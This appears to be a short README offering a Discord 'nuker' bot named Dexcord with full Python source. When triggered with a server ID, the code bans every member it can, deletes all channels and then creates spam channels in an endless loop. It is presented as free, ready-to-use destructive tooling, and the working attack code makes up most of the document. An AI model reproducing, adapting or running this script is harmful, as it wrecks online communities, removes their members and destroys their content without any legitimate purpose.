# How it works
It works by basic python and discord.py, everything is open source and the code is posted below.

# Free to use?
Of course! I mean, it's not that hard to make something like this.

# Source Code
nuker.py source code
```py
import random
import time
import discord
from discord.ext import commands
from discord.utils import get
import token_configuration
import discord_components
from discord_components import DiscordComponents, ComponentsBot, Button, Select, SelectOption


intents = discord.Intents.default()
intents.members = True

client = commands.Bot(command_prefix='!>', intents = intents)
DiscordComponents(client)

@client.event
async def on_ready():
    print("""
██████╗ ███████╗██╗  ██╗ ██████╗ ██████╗ ██████╗ ██████╗ 
██╔══██╗██╔════╝╚██╗██╔╝██╔════╝██╔═══██╗██╔══██╗██╔══██╗
██║  ██║█████╗   ╚███╔╝ ██║     ██║   ██║██████╔╝██║  ██║
██║  ██║██╔══╝   ██╔██╗ ██║     ██║   ██║██╔══██╗██║  ██║
██████╔╝███████╗██╔╝ ██╗╚██████╗╚██████╔╝██║  ██║██████╔╝
╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ 
                                                         
""")
    print("send a message to the bot with !>start GUILD_ID")



@client.command()
async def start(ctx, guild_id:discord.Guild):
    print(f"[!] start message from {ctx.author.name} for the guild {guild_id} has been received")
    embed = discord.Embed(
        title = f'Dexcord Nuker',
        description = (f"Welcome, {ctx.author.name}! Press the Start button to nuke {guild_id}!"),
        color = 0x02cdf5
    )
    await ctx.author.send(embed=embed, components = [[
        Button(label='Start', style="3", emoji=None, custom_id="startButton1")
    ]])
    interaction = await client.wait_for("button_click",  check = lambda i: i.custom_id == "startButton1")
    await interaction.send(content = f"check python application for output")
    print("nuking...")
    for i in guild_id.members:
        try:
            await guild_id.ban(i)
            print(f"[*] Banned {i}")
        except:
            print(f"[*] Unable to ban {i}")
            pass
    for c in guild_id.channels:
        await c.delete()
        print(f"[*] Removing {c}")
    while True:
        channelName = "dexcord-nuked"
        await guild_id.create_text_channel(name='{}'.format(channelName))
        print(f"[*] Created channel {channelName}")
    

key = token_configuration.TOKEN

client.run(key)
```
token_configuration.py source code
```py
TOKEN = "UR TOKEN HERE"
```
